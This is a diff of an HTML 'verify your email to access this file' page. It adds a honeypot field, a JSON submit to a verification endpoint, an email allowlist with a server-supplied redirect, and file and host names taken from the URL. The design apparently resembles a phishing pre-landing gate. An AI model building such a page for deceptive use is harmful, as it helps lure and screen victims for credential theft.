@@ -197,6 +197,16 @@
        decoding="async" loading="eager">
 
 
+
+
+  <!-- Honeypot (must stay empty) -->
+<input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
+       aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
+
+<!-- Optional Cloudflare Turnstile/Recaptcha token holder -->
+<input type="hidden" id="cfToken" name="cfToken" value="">
+
+  
   
   
   
@@ -236,25 +246,88 @@
  
 
   <script>
-    // Minimal progressive enhancement
-    const email = document.getElementById('email');
-    const btn   = document.getElementById('continueBtn');
-    const year  = document.getElementById('year');
-    year.textContent = new Date().getFullYear();
+  // ---- Elements
+  const form  = document.getElementById('verifyForm');
+  const email = document.getElementById('email');
+  const btn   = document.getElementById('continueBtn');
 
-    // Enable button when email looks plausible
-    const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
-    email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
+  // Optional hidden fields (added below)
+  const cfTok = document.getElementById('cfToken');      // may be null
+  const hp    = document.getElementById('middleName');   // honeypot
 
-    // Optional: capture file name & host from query (?file=...&host=...)
-    const q = new URLSearchParams(location.search);
-    if(q.get('file')) document.getElementById('fileName').textContent = q.get('file');
-    if(q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
+  // enable button only when email shape is OK
+  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
+  email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
 
-    // SECURITY NOTE: Always validate server-side; do not trust JS validation.
-  </script>
-  <noscript>
-    <div class="footer" style="padding-top:0">JavaScript is disabled. You can still submit the form.</div>
-  </noscript>
+  // helper: show a neutral message
+  function showMsg(text, ok=false){
+    let el = document.getElementById('alert');
+    if (!el) {
+      el = document.createElement('div');
+      el.id = 'alert';
+      el.className = 'alert';
+      form.querySelector('.card-body').appendChild(el);
+    }
+    el.textContent = text;
+    el.setAttribute('role', 'status');
+    el.style.color = ok ? '#1e5fcc' : '#b91c1c';
+    el.style.marginTop = '8px';
+    el.style.fontSize = '12px';
+  }
+
+  // Progressive-enhanced JSON submit (your backend requires JSON)
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    // FRONT-END GUARD: keep disabled if bad shape
+    if (!looksLikeEmail(email.value)) return;
+
+    btn.disabled = true;
+    const original = btn.textContent;
+    btn.textContent = 'Checking…';
+
+    const payload = {
+      email: String(email.value || '').trim().toLowerCase(),
+      jsToken: 'ok-' + Math.random().toString(36).slice(2),
+      cfToken: cfTok ? cfTok.value : '',
+      middleName: hp ? hp.value : ''   // must be empty, or backend will flag honeypot
+    };
+
+    try {
+      const res = await fetch(form.getAttribute('action') || '/verify', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json; charset=utf-8',
+          'X-Client-Lang': navigator.language || 'en'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const data = await res.json().catch(() => ({}));
+
+      if (res.ok && data && data.valid && data.redirect) {
+        // ✅ whitelisted — backend gave us a redirect URL
+        showMsg(data.message || 'Validated', true);
+        location.assign(data.redirect);
+        return;
+      }
+
+      // Neutral messaging (avoid membership leaks)
+      const msg = (data && data.message) || 'Unable to verify your email. Please try again.';
+      showMsg('If your email is permitted for this file, you will receive access shortly.');
+    } catch (err) {
+      showMsg('Network issue. Please retry in a moment.');
+    } finally {
+      btn.disabled = !looksLikeEmail(email.value);
+      btn.textContent = original;
+    }
+  });
+
+  // Optional query params → UI
+  const q = new URLSearchParams(location.search);
+  if (q.get('file')) document.getElementById('fileName').textContent = q.get('file');
+  if (q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
+</script>
+
 </body>
 </html>
